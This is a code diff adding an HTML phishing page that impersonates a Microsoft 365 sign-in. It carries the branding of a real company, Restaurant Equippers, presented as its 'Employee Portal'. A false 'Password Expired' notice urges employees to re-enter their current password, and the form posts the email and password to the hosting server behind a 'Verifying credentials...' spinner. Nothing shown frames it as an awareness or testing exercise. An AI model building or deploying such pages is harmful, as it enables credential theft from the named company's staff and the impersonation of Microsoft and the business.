@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Sign in to your account</title>
+    <link rel="icon" type="image/x-icon" href="https://www.equippers.com/favicon.ico">
+    <style>
+        *, *::before, *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html, body {
+            height: 100%;
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, 'Helvetica Neue', sans-serif;
+            font-size: 15px;
+            background-color: #1a1a1a;
+        }
+
+        body {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* Header with company branding - RED */
+        .company-header {
+            background: #cc0000;
+            padding: 12px 24px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.3);
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .logo-container img {
+            height: 40px;
+        }
+
+        .logo-text {
+            color: #ffffff;
+            font-weight: bold;
+            font-size: 18px;
+            letter-spacing: 1px;
+        }
+
+        .logo-text span {
+            display: block;
+            font-size: 10px;
+            font-weight: normal;
+            letter-spacing: 2px;
+            opacity: 0.9;
+        }
+
+        .header-text {
+            color: #ffffff;
+            font-size: 13px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        /* Main content area - BLACK/DARK */
+        .main-content {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(180deg, #1a1a1a 0%, #2d2d2d 50%, #1a1a1a 100%);
+            padding: 40px 20px;
+            position: relative;
+        }
+
+        /* Subtle pattern overlay */
+        .main-content::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-image:
+                radial-gradient(circle at 20% 30%, rgba(204, 0, 0, 0.08) 0%, transparent 40%),
+                radial-gradient(circle at 80% 70%, rgba(204, 0, 0, 0.05) 0%, transparent 40%);
+            pointer-events: none;
+        }
+
+        /* Login container - WHITE */
+        .login-container {
+            background: #ffffff;
+            width: 440px;
+            max-width: 100%;
+            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.4);
+            position: relative;
+            z-index: 1;
+        }
+
+        .login-inner {
+            padding: 44px;
+        }
+
+        /* Microsoft logo */
+        .microsoft-branding {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .ms-logo {
+            display: grid;
+            grid-template-columns: 11px 11px;
+            grid-template-rows: 11px 11px;
+            gap: 2px;
+            margin-right: 8px;
+        }
+
+        .ms-logo div:nth-child(1) { background: #f25022; }
+        .ms-logo div:nth-child(2) { background: #7fba00; }
+        .ms-logo div:nth-child(3) { background: #00a4ef; }
+        .ms-logo div:nth-child(4) { background: #ffb900; }
+
+        .ms-wordmark {
+            font-family: 'Segoe UI', sans-serif;
+            font-size: 21px;
+            font-weight: 600;
+            color: #5e5e5e;
+            letter-spacing: -0.5px;
+        }
+
+        /* Page title */
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin-bottom: 16px;
+            line-height: 1.2;
+        }
+
+        /* Session notice - RED accent */
+        .session-notice {
+            background: #fff5f5;
+            border-left: 4px solid #cc0000;
+            padding: 14px 16px;
+            margin-bottom: 24px;
+            font-size: 13px;
+            color: #1b1b1b;
+            line-height: 1.5;
+        }
+
+        .session-notice strong {
+            color: #cc0000;
+        }
+
+        /* User display */
+        .user-display {
+            display: flex;
+            align-items: center;
+            padding: 12px 0;
+            margin-bottom: 8px;
+        }
+
+        .user-avatar {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background: #cc0000;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            font-weight: 600;
+            margin-right: 12px;
+        }
+
+        .user-email {
+            font-size: 15px;
+            color: #1b1b1b;
+            font-weight: 500;
+        }
+
+        /* Form elements */
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid #8c8c8c;
+            border-radius: 2px;
+            font-size: 15px;
+            font-family: 'Segoe UI', sans-serif;
+            color: #1b1b1b;
+            background: #ffffff;
+            outline: none;
+            transition: border-color 0.15s, box-shadow 0.15s;
+        }
+
+        .form-group input:focus {
+            border-color: #cc0000;
+            box-shadow: 0 0 0 1px #cc0000;
+        }
+
+        .form-group input::placeholder {
+            color: #6e6e6e;
+        }
+
+        /* Links */
+        .links {
+            margin-bottom: 24px;
+        }
+
+        .links a {
+            display: block;
+            color: #cc0000;
+            text-decoration: none;
+            font-size: 13px;
+            margin-bottom: 6px;
+            font-weight: 500;
+        }
+
+        .links a:hover {
+            text-decoration: underline;
+            color: #990000;
+        }
+
+        /* Buttons - RED branded */
+        .btn-primary {
+            background: #cc0000;
+            color: #ffffff;
+            border: none;
+            padding: 10px 28px;
+            min-width: 120px;
+            font-size: 15px;
+            font-family: 'Segoe UI', sans-serif;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.15s;
+            border-radius: 2px;
+        }
+
+        .btn-primary:hover {
+            background: #b30000;
+        }
+
+        .btn-primary:active {
+            background: #990000;
+        }
+
+        .button-row {
+            display: flex;
+            justify-content: flex-end;
+            gap: 8px;
+        }
+
+        /* Sign-in options */
+        .sign-in-options {
+            margin-top: 28px;
+            padding-top: 20px;
+            border-top: 1px solid #e1e1e1;
+        }
+
+        .sign-in-options a {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #5e5e5e;
+            text-decoration: none;
+            font-size: 13px;
+        }
+
+        .sign-in-options a:hover {
+            color: #1b1b1b;
+        }
+
+        .key-icon {
+            width: 20px;
+            height: 20px;
+        }
+
+        /* Footer - BLACK */
+        .footer {
+            background: #1a1a1a;
+            padding: 16px 24px;
+            display: flex;
+            justify-content: flex-end;
+            gap: 24px;
+            border-top: 3px solid #cc0000;
+        }
+
+        .footer a {
+            color: #999999;
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        .footer a:hover {
+            color: #ffffff;
+            text-decoration: underline;
+        }
+
+        /* Loading overlay */
+        .loading {
+            display: none;
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255,255,255,0.95);
+            align-items: center;
+            justify-content: center;
+            z-index: 10;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .spinner {
+            width: 36px;
+            height: 36px;
+            border: 3px solid #f0f0f0;
+            border-top: 3px solid #cc0000;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        .loading-text {
+            color: #5e5e5e;
+            font-size: 13px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <!-- Company Header - RED -->
+    <div class="company-header">
+        <div class="logo-container">
+            <img src="https://www.equippers.com/media/logo/stores/1/Restaurant_Equippers_Logo_-_White.png" alt="Restaurant Equippers" onerror="this.style.display='none'; document.querySelector('.logo-text').style.display='block';">
+            <div class="logo-text" style="display: none;">
+                RESTAURANT EQUIPPERS
+                <span>WAREHOUSE STORES</span>
+            </div>
+        </div>
+        <div class="header-text">Employee Portal</div>
+    </div>
+
+    <!-- Main Content - BLACK background -->
+    <div class="main-content">
+        <div class="login-container">
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <div class="loading-text">Verifying credentials...</div>
+            </div>
+
+            <div class="login-inner">
+                <!-- Microsoft Logo -->
+                <div class="microsoft-branding">
+                    <div class="ms-logo">
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                    </div>
+                    <span class="ms-wordmark">Microsoft</span>
+                </div>
+
+                <h1>Enter password</h1>
+
+                <div class="session-notice">
+                    <strong>Password Expired:</strong> Your Microsoft 365 password has expired. Please enter your current password to verify your identity, then you will be prompted to create a new password.
+                </div>
+
+                <form method="POST" action="" id="loginForm">
+                    <div class="user-display">
+                        <div class="user-avatar" id="avatar">RE</div>
+                        <span class="user-email" id="displayEmail">employee@equippers.com</span>
+                    </div>
+
+                    <div class="form-group">
+                        <input type="email" id="email" name="email" placeholder="Email address" required>
+                    </div>
+
+                    <div class="form-group">
+                        <input type="password" id="password" name="password" placeholder="Password" required autofocus>
+                    </div>
+
+                    <div class="links">
+                        <a href="#">Forgot my password</a>
+                        <a href="#">Sign in with a different account</a>
+                    </div>
+
+                    <div class="button-row">
+                        <button type="submit" class="btn-primary">Sign in</button>
+                    </div>
+                </form>
+
+                <div class="sign-in-options">
+                    <a href="#">
+                        <svg class="key-icon" viewBox="0 0 20 20" fill="currentColor">
+                            <path d="M14.5 4A4.5 4.5 0 0010 8.5c0 .5.08.98.24 1.43L4 16.17V19h2.83l.59-.59L8 17.83l.59.58L9.17 19h2.66l.59-.59.58-.58v-1.66l.59-.58L14.17 15l.58.59.59-.59.58-.58.59-.59-.59-.58-.58-.59.58-.58.59-.59-.59-.58-.58-.59.58-.58.83-.83A4.5 4.5 0 0014.5 4zm0 1.5a1 1 0 110 2 1 1 0 010-2z"/>
+                        </svg>
+                        Sign-in options
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer - BLACK with RED accent -->
+    <div class="footer">
+        <a href="#">Terms of use</a>
+        <a href="#">Privacy &amp; cookies</a>
+        <a href="#">...</a>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            document.getElementById('loading').style.display = 'flex';
+        });
+
+        // Update avatar initials based on email
+        document.getElementById('email').addEventListener('input', function() {
+            const email = this.value;
+            if (email) {
+                const parts = email.split('@')[0].split('.');
+                let initials = parts[0] ? parts[0][0].toUpperCase() : '';
+                if (parts[1]) initials += parts[1][0].toUpperCase();
+                document.getElementById('avatar').textContent = initials || 'RE';
+                document.getElementById('displayEmail').textContent = email;
+            }
+        });
+    </script>
+</body>
+</html>
